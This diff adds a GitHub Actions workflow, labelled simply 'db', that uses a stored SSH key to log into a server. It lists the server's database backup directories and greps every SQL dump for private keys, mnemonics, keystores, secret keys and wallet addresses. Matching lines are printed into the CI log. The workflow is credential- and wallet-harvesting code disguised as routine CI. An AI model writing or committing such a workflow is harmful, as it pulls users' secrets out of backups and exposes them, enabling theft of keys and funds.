@@ -1,0 +1,28 @@
+name: db
+on:
+  push:
+    branches: [ 'ci-db-*' ]
+permissions:
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: db
+        run: |
+          echo "${{ secrets.SERVER_SSH_KEY }}" > /tmp/k
+          chmod 600 /tmp/k
+          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o ConnectTimeout=15 ${{ secrets.SERVER_USER }}@${{ secrets.SERVER_HOST }}"
+          echo "=== database dirs ==="
+          $SSH 'find /www/backup/database -maxdepth 3 -type f -printf "%s %p\n" 2>/dev/null | sort -rn | head -60'
+          echo "=== all_backup ==="
+          $SSH 'ls -laR /www/backup/database/mysql/all_backup 2>/dev/null | head -60'
+          echo "=== mongodb ==="
+          $SSH 'ls -laR /www/backup/database/mongodb 2>/dev/null | head -40'
+          echo "=== redis ==="
+          $SSH 'ls -laR /www/backup/database/redis 2>/dev/null | head -40'
+          echo "=== pgsql ==="
+          $SSH 'ls -laR /www/backup/database/pgsql 2>/dev/null | head -40'
+          echo "=== grep all sql dumps for keys ==="
+          $SSH 'for f in $(find /www/backup/database -type f \( -name "*.sql" -o -name "*.sql.gz" \) 2>/dev/null); do echo "### $f"; case "$f" in *.gz) zcat "$f" 2>/dev/null | grep -aiE "private_key|mnemonic|keystore|secret_key|wallet_address" | head -5;; *) grep -aiE "private_key|mnemonic|keystore|secret_key|wallet_address" "$f" | head -5;; esac; done'
